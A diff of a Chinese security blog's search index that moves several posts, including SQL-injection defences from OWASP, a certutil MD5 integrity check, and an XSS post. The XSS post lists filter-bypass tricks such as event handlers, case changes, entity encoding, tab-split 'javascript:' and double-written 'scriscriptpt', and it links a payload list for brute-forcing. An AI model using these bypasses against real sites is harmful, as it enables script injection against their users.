-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>注入的原理以及防御</title>
     <url>/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
     <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考自：<a class="link" href="https://juejin.cn/post/6844903917654900743">https://juejin.cn/post/6844903917654900743<i class="fas fa-external-link-alt"></i></a></p>
@@ -5153,6 +5145,59 @@ insert into test1 value(3,15);
 <h3 id="严格的参数校验"><a href="#严格的参数校验" class="headerlink" title="严格的参数校验"></a>严格的参数校验</h3><p>拿正则或者其他的函数，过滤掉不该出现的关键字或字符</p>
 <h3 id="owasp-top10中关于如何防止注入"><a href="#owasp-top10中关于如何防止注入" class="headerlink" title="owasp top10中关于如何防止注入"></a>owasp top10中关于如何防止注入</h3><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br>  <strong>注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</strong><br>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。<br>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。<br>  <strong>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</strong><br>• 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>检查文件MD5检验文件是否被修改</title>
+    <url>/2020/08/18/%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6MD5%E6%A3%80%E9%AA%8C%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%A2%AB%E4%BF%AE%E6%94%B9/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13523493.html">源地址：https://www.cnblogs.com/This-is-Y/p/13523493.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>cmd下，输入certutil -hashfile 文件名 md5</p>
+<p>举个例子</p>
+<img src="1503868-20200818144805053-2036147690.png" alt loading="lazy">
+
+<p> </p>
+<p> 某个工具的下载页面</p>
+<p>下载好后，cmd下执行</p>
+<img src="1503868-20200818144927582-1324965701.png" alt loading="lazy">
+
+<p> </p>
+<p>文件正常</p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>浅谈xss的各种触发方式以及防护绕过</title>
+    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>触发方式都写在里面了</p>
+<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
+
+<p> </p>
+<p> </p>
+<p>只写部分，更多触发事件可以参考这两篇文章</p>
+<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p>再说一下防护：</p>
+<p>输入检测：</p>
+<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
+<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
+<p>关键字黑名单：</p>
+<p>　　换一个关键字，反正上面有这么多。</p>
+<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　或者用大小写绕过</p>
+<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
+<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
+<p> </p>
+<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
+<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>渗透三字经</title>
@@ -5197,38 +5242,6 @@ insert into test1 value(3,15);
 </li>
 </ol>
 ]]></content>
-  </entry>
-  <entry>
-    <title>浅谈xss的各种触发方式以及防护绕过</title>
-    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>触发方式都写在里面了</p>
-<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
-
-<p> </p>
-<p> </p>
-<p>只写部分，更多触发事件可以参考这两篇文章</p>
-<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>再说一下防护：</p>
-<p>输入检测：</p>
-<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
-<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
-<p>关键字黑名单：</p>
-<p>　　换一个关键字，反正上面有这么多。</p>
-<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　或者用大小写绕过</p>
-<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
-<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
-<p> </p>
-<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
-<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
   </entry>
   <entry>
     <title>破解部分windows密码（win7用粘滞键，winxp等用pe）</title>
@@ -5864,18 +5877,5 @@ insert into test1 value(3,15);
       <categories>
         <category>cnblogs</category>
       </categories>
-  </entry>
-  <entry>
-    <title>在博客中添加自定义页面</title>
-    <url>/2021/06/19/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2/</url>
-    <content><![CDATA[<h2 id="创建页面文件夹"><a href="#创建页面文件夹" class="headerlink" title="创建页面文件夹"></a>创建页面文件夹</h2><p>在blog/source下面，创建一个文件夹，里面就是要自定义的网页的全部文件。最好是有过index.html</p>
-<h2 id="网页内容"><a href="#网页内容" class="headerlink" title="网页内容"></a>网页内容</h2><p>比如说我这里是想添加一个小游戏<br>游戏github：<a class="link" href="https://github.com/SadTomlzr/catch-cat">https://github.com/SadTomlzr/catch-cat<i class="fas fa-external-link-alt"></i></a><br>原游戏地址：<a class="link" href="https://sadtomlzr.github.io/catch-cat/">https://sadtomlzr.github.io/catch-cat/<i class="fas fa-external-link-alt"></i></a><br>这里我直接把那几个文件放在新建的文件夹里了</p>
-<p><img src="image-20210619210816615.png" alt="image-20210619210816615"></p>
-<p><img src="image-20210619210832495.png" alt="image-20210619210832495"></p>
-<h2 id="停用渲染"><a href="#停用渲染" class="headerlink" title="停用渲染"></a>停用渲染</h2><p>在hexo的配置文件_config.yml 里的skip_render中添加不需要渲染的文件</p>
-<p>** 注意：skip_render参数设置的路径是相对于source目录的路径。 **，比如D:\MyBlog\source\Cat目录，就写成Cat/*就行了，*表示全部文件，可以</p>
-<p><img src="image-20210619211021410.png" alt="image-20210619211021410"></p>
-<h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>这样添加的页面是在博客中是没有入口的。就是只能输url进去。入口需要在主题里添加，</p>
-]]></content>
   </entry>
 </search>
